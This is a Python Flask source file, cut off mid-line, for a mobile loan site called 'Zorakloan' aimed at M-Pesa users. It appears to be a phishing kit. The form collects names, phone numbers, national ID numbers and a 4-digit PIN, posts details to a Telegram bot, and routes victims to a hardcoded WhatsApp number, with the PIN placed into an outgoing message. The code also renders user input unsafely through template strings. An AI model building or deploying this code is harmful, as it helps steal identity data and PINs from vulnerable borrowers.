import os, random
from flask import Flask, request, render_template_string, session, redirect
import requests
app = Flask(__name__)
app.secret_key = "zorak-final-textme-254119912568"
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
MY_WA = "254119912568"  # YOUR NUMBER
loans_db = {}

@app.route('/', methods=['GET','POST'])
def home(): return redirect('/api')

@app.route('/api', methods=['GET','POST'])
@app.route('/apply', methods=['GET','POST'])
def apply_route():
    if request.method == 'POST':
        otp = str(random.randint(100000,999999))
        ref = f"ZRK-{random.randint(1000,9999)}"
        pending = {k: request.form.get(k) for k in ['full_name','phone','id_number','county','amount','period','employment','pin']}
        pending['ref']=ref
        session['pending']=pending; session['otp']=otp
        try:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id":CHAT_ID, "text": f"🔑 OTP {otp}\n📞 {pending['phone']}\n👤 {pending['full_name']}\nRef {ref}"})
        except: pass
        return render_template_string(f"""
        <html><head><meta name="viewport" content="width=device-width, initial-scale=1"><style>
        body{{font-family:Arial;background:#f0f4f0;padding:15px}}.box{{background:white;max-width:400px;margin:60px auto;padding:30px;border-radius:15px;text-align:center;box-shadow:0 5px 20px rgba(0,0,0,0.1)}}
        .otp-big{{font-size:32px;letter-spacing:8px;font-weight:bold;color:#0a7a3e;background:#e8f5e9;padding:15px;border-radius:10px;margin:15px 0;border:2px dashed #0a7a3e}}
        .wa-float{{position:fixed;bottom:20px;right:20px;background:#25D366;color:white;padding:12px 18px;border-radius:50px;text-decoration:none;font-weight:bold;box-shadow:0 4px 10px rgba(0,0,0,0.3);z-index:999}}
        </style></head><body><div class="box">
        <h2>📱 SMS Sent!</h2><p>Code sent to <b>{pending['phone']}</b></p>
        <div class="otp-big">{otp}</div>
        <form method="POST" action="/verify-otp"><input name="otp" maxlength="6" placeholder="Enter 6-digit code" required style="width:100%;padding:14px;font-size:20px;text-align:center;letter-spacing:5px;border:2px solid #0a7a3e;border-radius:8px"><button style="width:100%;padding:14px;background:#0a7a3e;color:white;border:none;border-radius:8px;margin-top:15px;font-size:17px;font-weight:bold">Verify & Get Loan</button></form>
        <a href="https://wa.me/{MY_WA}?text=Hello%2C%20I%20need%20help%20with%20OTP%20{ref}" style="display:block;margin-top:15px;color:#25D366;text-decoration:none">💬 Need help? Text me</a>
        </div><a href="https://wa.me/{MY_WA}?text=Hello%20Zorakloan" class="wa-float">💬 Text Me</a></body></html>
        """)
    return render_template_string(f"""
    <html><head><meta name="viewport" content="width=device-width, initial-scale=1"><style>
    body{{font-family:Arial;background:#f0f4f0;padding:15px}}.box{{background:white;max-width:430px;margin:auto;padding:25px;border-radius:15px;box-shadow:0 5px 20px rgba(0,0,0,0.1)}}h2{{text-align:center;color:#0a7a3e}}input,select{{width:100%;padding:12px;margin:7px 0;border:1px solid #ccc;border-radius:8px;box-sizing:border-box}}button{{width:100%;padding:14px;background:#0a7a3e;color:white;border:none;border-radius:8px;font-size:17px;font-weight:bold}}.pin{{background:#fff8e1;padding:10px;border-radius:8px;border:1px dashed #ffb300}}.wa-float{{position:fixed;bottom:20px;right:20px;background:#25D366;color:white;padding:12px 18px;border-radius:50px;text-decoration:none;font-weight:bold;box-shadow:0 4px 10px rgba(0,0,0,0.3);z-index:999}}
    </style></head><body><div class="box"><h2>Zorakloan 🇰🇪</h2><p style="text-align:center;color:gray;font-size:13px">Instant | Secure OTP | 24/7</p>
    <form method="POST"><input name="full_name" placeholder="Full Name" required><input name="phone" placeholder="M-Pesa Phone 07..." required><input name="id_number" placeholder="ID Number" required><input name="county" placeholder="County" required><input name="amount" type="number" placeholder="Amount Ksh 500-50000" required><select name="period" required><option value="">Loan Duration</option><option>7 Days</option><option>14 Days</option><option>1 Month</option></select><select name="employment" required><option value="">Employment</option><option>Employed</option><option>Business</option><option>Farmer</option><option>Student</option></select><div class="pin"><b>🔐 Create 4-digit PIN</b><input name="pin" type="password" maxlength="4" placeholder="e.g 4520" required></div><button>Apply Now →</button></form>
    <div style="text-align:center;margin-top:15px"><a href="tel:+{MY_WA}" style="background:#0a7a3e;color:white;padding:10px 15px;border-radius:8px;text-decoration:none;margin:5px;display:inline-block">📞 Call</a><a href="https://wa.me/{MY_WA}" style="background:#25D366;color:white;padding:10px 15px;border-radius:8px;text-decoration:none;margin:5px;display:inline-block">💬 WhatsApp</a></div>
    </div><a href="https://wa.me/{MY_WA}?text=Hello%20Zorakloan%20I%20want%20a%20loan" class="wa-float">💬 Text Me</a></body></html>
    """)

@app.route('/verify-otp', methods=['GET','POST'])
def verify():
    if request.method == 'GET': return redirect('/api')
    if request.form.get('otp') == session.get('otp') and session.get('pending'):
        loan = session.get('pending'); loans_db[loan['phone']] = loan
        wa_msg = f"Hello%20Zorakloan%2C%20I%20applied%20Ref%20{loan['ref']}%20Amount%20{loan['amount']}%20My%20PIN%20{